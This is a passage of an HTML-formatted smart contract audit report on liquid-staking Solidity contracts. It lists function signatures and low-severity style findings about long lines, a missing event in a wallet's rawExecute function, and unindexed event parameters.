class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">11</span><span class=\"mtk1\">:     </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> </span><span class=\"mtk10\">deploy</span><span class=\"mtk1\">(</span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_liquidStakingManager</span><span class=\"mtk1\">) </span><span class=\"mtk10\">external</span><span class=\"mtk1\"> </span><span class=\"mtk10\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk10\">OptionalHouseGatekeeper</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk10\">liquid</span><span class=\"mtk1\">-</span><span class=\"mtk10\">staking</span><span class=\"mtk1\">/</span><span class=\"mtk10\">SavETHVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">45</span><span class=\"mtk1\">:     </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> </span><span class=\"mtk10\">init</span><span class=\"mtk1\">(</span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_liquidStakingManagerAddress</span><span class=\"mtk1\">, </span><span class=\"mtk10\">LPTokenFactory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_lpTokenFactory</span><span class=\"mtk1\">) </span><span class=\"mtk10\">external</span><span class=\"mtk1\"> </span><span class=\"mtk10\">virtual</span><span class=\"mtk1\"> </span><span class=\"mtk10\">initializer</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk10\">liquid</span><span class=\"mtk1\">-</span><span class=\"mtk10\">staking</span><span class=\"mtk1\">/</span><span class=\"mtk10\">SavETHVaultDeployer</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">18</span><span class=\"mtk1\">:     </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> </span><span class=\"mtk10\">deploySavETHVault</span><span class=\"mtk1\">(</span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_liquidStakingManger</span><span class=\"mtk1\">, </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_lpTokenFactory</span><span class=\"mtk1\">) </span><span class=\"mtk10\">external</span><span class=\"mtk1\"> </span><span class=\"mtk10\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk10\">address</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk10\">smart</span><span class=\"mtk1\">-</span><span class=\"mtk10\">wallet</span><span class=\"mtk1\">/</span><span class=\"mtk10\">OwnableSmartWalletFactory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">28</span><span class=\"mtk1\">:     </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> </span><span class=\"mtk10\">createWallet</span><span class=\"mtk1\">() </span><span class=\"mtk10\">external</span><span class=\"mtk1\"> </span><span class=\"mtk10\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">wallet</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">32</span><span class=\"mtk1\">:     </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> </span><span class=\"mtk10\">createWallet</span><span class=\"mtk1\">(</span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">owner</span><span class=\"mtk1\">) </span><span class=\"mtk10\">external</span><span class=\"mtk1\"> </span><span class=\"mtk10\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">wallet</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">36</span><span class=\"mtk1\">:     </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_createWallet</span><span class=\"mtk1\">(</span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">owner</span><span class=\"mtk1\">) </span><span class=\"mtk10\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk10\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">wallet</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk10\">smart</span><span class=\"mtk1\">-</span><span class=\"mtk10\">wallet</span><span class=\"mtk1\">/</span><span class=\"mtk10\">interfaces</span><span class=\"mtk1\">/</span><span class=\"mtk10\">IOwnableSmartWalletFactory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">9</span><span class=\"mtk1\">:     </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> </span><span class=\"mtk10\">createWallet</span><span class=\"mtk1\">() </span><span class=\"mtk10\">external</span><span class=\"mtk1\"> </span><span class=\"mtk10\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">wallet</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">11</span><span class=\"mtk1\">:     </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> </span><span class=\"mtk10\">createWallet</span><span class=\"mtk1\">(</span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">owner</span><span class=\"mtk1\">) </span><span class=\"mtk10\">external</span><span class=\"mtk1\"> </span><span class=\"mtk10\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">wallet</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">13</span><span class=\"mtk1\">:     </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> </span><span class=\"mtk10\">walletExists</span><span class=\"mtk1\">(</span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">wallet</span><span class=\"mtk1\">) </span><span class=\"mtk10\">external</span><span class=\"mtk1\"> </span><span class=\"mtk10\">view</span><span class=\"mtk1\"> </span><span class=\"mtk10\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk10\">bool</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk10\">testing</span><span class=\"mtk1\">/</span><span class=\"mtk10\">interfaces</span><span class=\"mtk1\">/</span><span class=\"mtk10\">IFactoryDependencyInjector</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">6</span><span class=\"mtk1\">:     </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> </span><span class=\"mtk10\">accountMan</span><span class=\"mtk1\">() </span><span class=\"mtk10\">external</span><span class=\"mtk1\"> </span><span class=\"mtk10\">view</span><span class=\"mtk1\"> </span><span class=\"mtk10\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk10\">address</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">8</span><span class=\"mtk1\">:     </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> </span><span class=\"mtk10\">txRouter</span><span class=\"mtk1\">() </span><span class=\"mtk10\">external</span><span class=\"mtk1\"> </span><span class=\"mtk10\">view</span><span class=\"mtk1\"> </span><span class=\"mtk10\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk10\">address</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">10</span><span class=\"mtk1\">:     </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uni</span><span class=\"mtk1\">() </span><span class=\"mtk10\">external</span><span class=\"mtk1\"> </span><span class=\"mtk10\">view</span><span class=\"mtk1\"> </span><span class=\"mtk10\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk10\">address</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">12</span><span class=\"mtk1\">:     </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> </span><span class=\"mtk10\">slot</span><span class=\"mtk1\">() </span><span class=\"mtk10\">external</span><span class=\"mtk1\"> </span><span class=\"mtk10\">view</span><span class=\"mtk1\"> </span><span class=\"mtk10\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk10\">address</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">14</span><span class=\"mtk1\">:     </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> </span><span class=\"mtk10\">saveETHRegistry</span><span class=\"mtk1\">() </span><span class=\"mtk10\">external</span><span class=\"mtk1\"> </span><span class=\"mtk10\">view</span><span class=\"mtk1\"> </span><span class=\"mtk10\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk10\">address</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">16</span><span class=\"mtk1\">:     </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> </span><span class=\"mtk10\">dETH</span><span class=\"mtk1\">() </span><span class=\"mtk10\">external</span><span class=\"mtk1\"> </span><span class=\"mtk10\">view</span><span class=\"mtk1\"> </span><span class=\"mtk10\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk10\">address</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<h2 id=\"n-08-lines-are-too-long\" style=\"position:relative;\"><a href=\"#n-08-lines-are-too-long\" aria-label=\"n 08 lines are too long permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-08] Lines are too long</h2>\n<p>Usually lines in source code are limited to 80 characters. Today’s screens are much larger so it’s reasonable to stretch this in some cases. Since the files will most likely reside in GitHub, and GitHub starts using a scroll bar in all cases when the length is over 164 characters, the lines below should be split when they reach that length.<br>\nReference: <a href=\"https://docs.soliditylang.org/en/v0.8.10/style-guide.html#maximum-line-length\">https://docs.soliditylang.org/en/v0.8.10/style-guide.html#maximum-line-length</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"168\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">9</span><span class=\"mtk1\"> </span><span class=\"mtk12\">results</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">syndicate</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Syndicate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">216</span><span class=\"mtk1\">:             </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">isKnotRegistered</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_blsPubKey</span><span class=\"mtk1\">] || </span><span class=\"mtk12\">isNoLongerPartOfSyndicate</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_blsPubKey</span><span class=\"mtk1\">]) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">KnotIsNotRegisteredWithSyndicate</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">447</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> ((</span><span class=\"mtk11\">calculateETHForFreeFloatingOrCollateralizedHolders</span><span class=\"mtk1\">() - </span><span class=\"mtk12\">lastSeenETHPerCollateralizedSlotPerKnot</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">numberOfRegisteredKnots</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span><span class=\"mtk7\">511</span><span class=\"mtk1\">:                     </span><span class=\"mtk12\">accruedEarningPerCollateralizedSlotOwnerOfKnot</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_blsPubKey</span><span class=\"mtk1\">][</span><span class=\"mtk12\">collateralizedOwnerAtIndex</span><span class=\"mtk1\">] += </span><span class=\"mtk12\">unprocessedETHForCurrentKnot</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">liquid</span><span class=\"mtk1\">-</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ETHPoolLPFactory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">92</span><span class=\"mtk1\">:             </span><span class=\"mtk11\">getAccountManager</span><span class=\"mtk1\">().</span><span class=\"mtk11\">blsPublicKeyToLifecycleStatus</span><span class=\"mtk1\">(</span><span class=\"mtk12\">blsPublicKeyOfPreviousKnot</span><span class=\"mtk1\">) == </span><span class=\"mtk12\">IDataStructures</span><span class=\"mtk1\">.</span><span class=\"mtk12\">LifecycleStatus</span><span class=\"mtk1\">.</span><span class=\"mtk12\">INITIALS_REGISTERED</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">97</span><span class=\"mtk1\">:             </span><span class=\"mtk11\">getAccountManager</span><span class=\"mtk1\">().</span><span class=\"mtk11\">blsPublicKeyToLifecycleStatus</span><span class=\"mtk1\">(</span><span class=\"mtk12\">blsPublicKeyOfNewKnot</span><span class=\"mtk1\">) ==</span><span class=\"mtk12\">IDataStructures</span><span class=\"mtk1\">.</span><span class=\"mtk12\">LifecycleStatus</span><span class=\"mtk1\">.</span><span class=\"mtk12\">INITIALS_REGISTERED</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">liquid</span><span class=\"mtk1\">-</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">/</span><span class=\"mtk12\">GiantLP</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">40</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">transferHookProcessor</span><span class=\"mtk1\">) != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) </span><span class=\"mtk11\">ITransferHookProcessor</span><span class=\"mtk1\">(</span><span class=\"mtk12\">transferHookProcessor</span><span class=\"mtk1\">).</span><span class=\"mtk11\">beforeTokenTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">46</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">transferHookProcessor</span><span class=\"mtk1\">) != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) </span><span class=\"mtk11\">ITransferHookProcessor</span><span class=\"mtk1\">(</span><span class=\"mtk12\">transferHookProcessor</span><span class=\"mtk1\">).</span><span class=\"mtk11\">afterTokenTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">liquid</span><span class=\"mtk1\">-</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">/</span><span class=\"mtk12\">GiantMevAndFeesPool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">97</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_previewAccumulatedETH</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_user</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lpTokenETH</span><span class=\"mtk1\">), </span><span class=\"mtk12\">lpTokenETH</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_user</span><span class=\"mtk1\">), </span><span class=\"mtk12\">lpTokenETH</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">accumulated</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">118</span><span class=\"mtk1\">:             </span><span class=\"mtk11\">StakingFundsVault</span><span class=\"mtk1\">(</span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_stakingFundsVaults</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">])).</span><span class=\"mtk11\">batchRotateLPTokens</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_oldLPTokens</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">], </span><span class=\"mtk12\">_newLPTokens</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">], </span><span class=\"mtk12\">_amounts</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]);</span></span></span></code></pre>\n<h2 id=\"n-09-missing-event-for-critical-parameters-change\" style=\"position:relative;\"><a href=\"#n-09-missing-event-for-critical-parameters-change\" aria-label=\"n 09 missing event for critical parameters change permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-09] Missing Event for critical parameters change</h2>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"169\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">smart</span><span class=\"mtk1\">-</span><span class=\"mtk12\">wallet</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OwnableSmartWallet</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">66</span><span class=\"mtk1\">      </span><span class=\"mtk3\">/// @inheritdoc IOwnableSmartWallet</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">67</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">rawExecute</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  68:         </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">target</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  69:         </span><span class=\"mtk10\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">callData</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  70:         </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">value</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">71</span><span class=\"mtk1\">:     )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  72:     </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  73:     </span><span class=\"mtk11\">override</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  74:     </span><span class=\"mtk11\">payable</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  75:     </span><span class=\"mtk11\">onlyOwner</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  76:     </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  77:     {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">78</span><span class=\"mtk1\">:         (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">result</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">message</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">target</span><span class=\"mtk1\">.</span><span class=\"mtk12\">call</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">value</span><span class=\"mtk1\">}(</span><span class=\"mtk12\">callData</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">79</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">result</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Failed to execute&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">80</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">message</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">81</span><span class=\"mtk1\">:     }</span></span></span></code></pre>\n<p><strong>Description:</strong><br>\nEvents help non-contract tools to track changes, and events prevent users from being surprised by changes</p>\n<p><strong>Recommendation:</strong><br>\nAdd Event-Emit</p>\n<h2 id=\"n-10-add-to-indexed-parameter-for-countable-events\" style=\"position:relative;\"><a href=\"#n-10-add-to-indexed-parameter-for-countable-events\" aria-label=\"n 10 add to indexed parameter for countable events permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-10] Add to indexed parameter for countable Events</h2>\n<p><strong>Context:</strong><br></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"170\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">liquid</span><span class=\"mtk1\">-</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ETHPoolLPFactory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">15</span><span class=\"mtk1\">      </span><span class=\"mtk3\">/// @notice signalize withdrawing of ETH by depositor</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">16</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">event</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ETHWithdrawnByDepositor</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">depositor</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span 